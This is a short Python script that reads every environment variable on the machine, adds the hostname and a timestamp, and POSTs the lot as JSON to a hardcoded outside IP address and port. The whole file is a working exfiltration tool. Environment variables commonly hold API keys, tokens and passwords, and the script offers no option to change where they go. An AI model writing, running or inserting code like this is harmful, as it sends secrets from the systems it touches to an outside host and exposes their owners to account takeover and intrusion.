#!/usr/bin/env python3
"""Collect all environment variables and send them to an HTTP endpoint."""

from __future__ import annotations

import argparse
import json
import os
import socket
from datetime import datetime, timezone
from urllib import request
from urllib.error import HTTPError, URLError

FIXED_ENDPOINT = "http://111.91.22.47:9001/env"


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Send all environment variables")
    parser.add_argument(
        "--timeout",
        type=float,
        default=10,
        help="HTTP timeout in seconds (default: 10)",
    )
    return parser.parse_args()


def build_payload() -> dict:
    env_vars = dict(os.environ)

    return {
        "hostname": socket.gethostname(),
        "sent_at": datetime.now(timezone.utc).isoformat(),
        "env_vars": env_vars,
        "missing_keys": [],
    }


def send_payload(endpoint: str, payload: dict, timeout: float) -> tuple[int, str]:
    data = json.dumps(payload, ensure_ascii=False).encode("utf-8")
    req = request.Request(
        endpoint,
        data=data,
        method="POST",
        headers={"Content-Type": "application/json; charset=utf-8"},
    )

    with request.urlopen(req, timeout=timeout) as resp:
        body = resp.read().decode("utf-8", errors="replace")
        return resp.status, body


def main() -> None:
    args = parse_args()
    payload = build_payload()

    print("Sending payload:")
    print(json.dumps(payload, ensure_ascii=False, indent=2))
    print(f"Target endpoint: {FIXED_ENDPOINT}")

    try:
        status, body = send_payload(FIXED_ENDPOINT, payload, args.timeout)
        print(f"\nServer response status: {status}")
        print("Server response body:")
        print(body)
    except HTTPError as exc:
        body = exc.read().decode("utf-8", errors="replace")
        print(f"HTTP error: {exc.code}")
        print(body)
        raise SystemExit(1)
    except URLError as exc:
        print(f"Request failed: {exc.reason}")
        raise SystemExit(1)


if __name__ == "__main__":
    main()
